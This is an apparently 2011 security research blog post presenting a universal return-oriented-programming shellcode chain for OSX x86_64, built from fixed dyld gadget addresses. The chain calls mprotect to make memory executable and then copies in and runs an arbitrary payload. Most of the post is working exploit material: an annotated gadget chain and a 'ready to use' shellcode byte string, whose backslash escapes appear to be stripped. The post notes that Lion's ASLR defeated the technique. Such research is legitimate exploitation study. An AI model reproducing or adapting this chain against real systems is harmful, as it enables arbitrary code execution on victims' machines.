---
title: Yet another universal OSX x86_64 dyld ROP shellcode
author: longld
layout: post

aktt_notify_twitter:
  - no
shorturls:
  - 'a:4:{s:5:"bitly";s:0:"";s:9:"permalink";s:86:"http://www.vnsecurity.net/2011/07/yet-another-universal-osx-x86_64-dyld-rop-shellcode/";s:7:"tinyurl";s:26:"http://tinyurl.com/84vmfss";s:4:"isgd";s:19:"http://is.gd/QvH3MF";}'
tweetbackscheck:
  - 1408358971
twittercomments:
  - 'a:0:{}'
tweetcount:
  - 0
kopa_newsmixlight_total_view:
  - 2
category:
  - research
tags:
  - '2011'
  - dyld
  - OSX
  - return-oriented-programming
  - rop
  - shellcode
---
This technique was killed by OSX Lion 10.7 with full ASLR. @pa_kt has posted an [Universal ROP shellcode for OS X x64][1] with detail steps and explanation. If you don&#8217;t have a chance to read above post, the basic ideas are:

*   Copy stubcode to a writable area (.data section)
*   Make that area RWX
*   Jump to RWX area and execute stubcode
*   Stubcode will transfer normal shellcode to RWX area and execute it
*   All the ROP gadgets are from dyld module which is not randomized

In this post, we shows another OSX x86_64 dyld ROP shellcode which is more simple. We employ the same ideas with some minor differences in implementation:

*   Instead of using long gadgets with &#8220;leave&#8221;, we use direct, short gadgets from unintended code
*   Calling mprotect() via syscall
*   Short stubcode (7 bytes) using memcpy() to transfer payload

Here is the ROP shellcode with explanation:

<pre class="brush: plain; title: ; notranslate" title=""># store [target], stubcode
0x00007fff5fc0e7ee # pop rsi ; adc al 0x83
0xc353575e545a5b90 # =&gt; rsi = stubcode
0x00007fff5fc24cdc # pop rdi
0x00007fff5fc74f80 # =&gt; rdi
0x00007fff5fc24d26 # mov [rdi+0x80] rsi; stubcode =&gt; [target]
# load rdx, 0x7 (prot RWX)
0x00007fff5fc24cdc # pop rdi
0x00007fff5fc75001 # =&gt; rdi
0x00007fff5fc1ddc0 # lea rax, [rdi-0x1]
0x00007fff5fc219c3 # pop rbp ; add [rax] al ; add cl cl
0x00007fff5fc75000 # =&gt; rbp
0x00007fff5fc0e7ee # pop rsi ; adc al 0x83
0x0000000000000007 # =&gt; rsi
0x00007fff5fc14149 # mov edx esi ; add [rax] al ; add [rbp+0x39] cl =&gt; rdx = 0x7
# load rsi, 4096 (size)
0x00007fff5fc0e7ee # pop rsi ; adc al 0x83
0x0000000000001000 # =&gt; rsi = 4096
# load rax, mprotect_syscal
0x00007fff5fc24cdc # pop rdi
0x000000000200004b # =&gt; rdi
0x00007fff5fc1ddc0 # lea rax, [rdi-0x1] =&gt; rax = 0x200004a (mprotect syscall)
# load rdi, target
0x00007fff5fc24cdc # pop rdi
0x00007fff5fc75000 # =&gt; rdi = target
# syscall
0x00007fff5fc1c76d # mov r10, rcx; syscall  =&gt; mprotect(target, 4096, 7)
0x00007fff5fc75000 # jump to target, execute stubcode
# stubcode
# 5B                pop rbx     # rbx -&gt; memcpy()
# 5A                pop rdx     # rdx -&gt; size
# 54                push rsp    # src -&gt; &shellcode
# 5E                pop rsi     # src -&gt; &shellcode
# 57                push rdi    # jump to target when return from memcpy()
# 53                push rbx    # memcpy()
# C3                ret         # execute memcpy(target, &shellcode, size)
0x00007fff5fc234f0 # &memcpy()
0x0000000000000200 # shellcode size = 512
&lt;your shellcode here&gt;
</pre>

You can verify those gadgets and find more here: <http://goo.gl/p35vY>

Ready to use shellcode:

<pre class="brush: plain; title: ; notranslate" title="">"xeexe7xc0x5fxffx7fx00x00x90x5bx5ax54x5ex57x53xc3"
"xdcx4cxc2x5fxffx7fx00x00x80x4fxc7x5fxffx7fx00x00"
"x26x4dxc2x5fxffx7fx00x00xdcx4cxc2x5fxffx7fx00x00"
"x01x50xc7x5fxffx7fx00x00xc0xddxc1x5fxffx7fx00x00"
"xc3x19xc2x5fxffx7fx00x00x00x50xc7x5fxffx7fx00x00"
"xeexe7xc0x5fxffx7fx00x00x07x00x00x00x00x00x00x00"
"x49x41xc1x5fxffx7fx00x00xeexe7xc0x5fxffx7fx00x00"
"x00x10x00x00x00x00x00x00xdcx4cxc2x5fxffx7fx00x00"
"x4bx00x00x02x00x00x00x00xc0xddxc1x5fxffx7fx00x00"
"xdcx4cxc2x5fxffx7fx00x00x00x50xc7x5fxffx7fx00x00"
"x6dxc7xc1x5fxffx7fx00x00x00x50xc7x5fxffx7fx00x00"
"xf0x34xc2x5fxffx7fx00x00x00x02x00x00x00x00x00x00"
</pre>
 [1]: http://gdtr.wordpress.com/2011/07/23/universal-rop-shellcode-for-os-x-x64/